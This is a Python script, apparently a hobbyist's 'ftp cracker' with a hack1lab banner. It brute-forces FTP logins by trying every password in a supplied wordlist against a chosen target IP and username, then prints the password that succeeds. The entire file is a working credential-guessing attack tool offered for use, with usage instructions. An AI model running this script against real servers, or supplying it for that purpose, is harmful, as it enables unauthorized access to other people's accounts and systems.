# !/usr/bin/env python

import ftplib
from optparse import *


class colors:
    def __init__(self):
        self.blue = "\033[94m"
        self.red = "\033[91m"
        self.end = "\033[0m"


cl = colors()

print(
    cl.blue
    + """
	*--------------------------------------*
	|       programmed by : mohamed        |
	|           fb.me/hack1lab             |
	*--------------------------------------*
	   _                _    _       _     
	  | |__   __ _  ___| | _| | __ _| |__  
	  | '_ \ / _` |/ __| |/ / |/ _` | '_ \ 
	  | | | | (_| | (__|   <| | (_| | |_) |
	  |_| |_|\__,_|\___|_|\_\_|\__,_|_.__/ 
	
	               ftp cracker
	              -------------

"""
    + cl.end
)


def connect(host, user, password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user, password)
        print(
            cl.red
            + "\nLogin successfuly with password: "
            + str(password)
            + cl.end
            + "\n"
        )
        ftp.quit()
        exit(0)
    except Exception:
        return False


parser = OptionParser(
    """

#Usage:

	python ftp_cracker.py -t <Target IP> -u <User> -p <Password File>
	
#Example:

	python ftp_cracker.py -t 127.0.0.1 -u hacklab -p wordlist.txt

		"""
)


try:
    parser.add_option("-t", dest="target", type="string", help="enter target ip")
    parser.add_option("-u", dest="user", type="string", help="enter target user")
    parser.add_option("-p", dest="password", type="string", help="enter passwords file")
    (options, args) = parser.parse_args()
    if options.target == None or options.user == None or options.password == None:
        print(cl.blue + parser.usage + cl.end)
        exit(0)
    else:
        host = str(options.target)
        user = str(options.user)
        password = str(options.password)

        read = open(password, "r")
        for word in read:
            word = word.strip("\n")
            print("Testing: " + str(word))
            connect(host, user, word)
except Exception:
    print("there error !!")
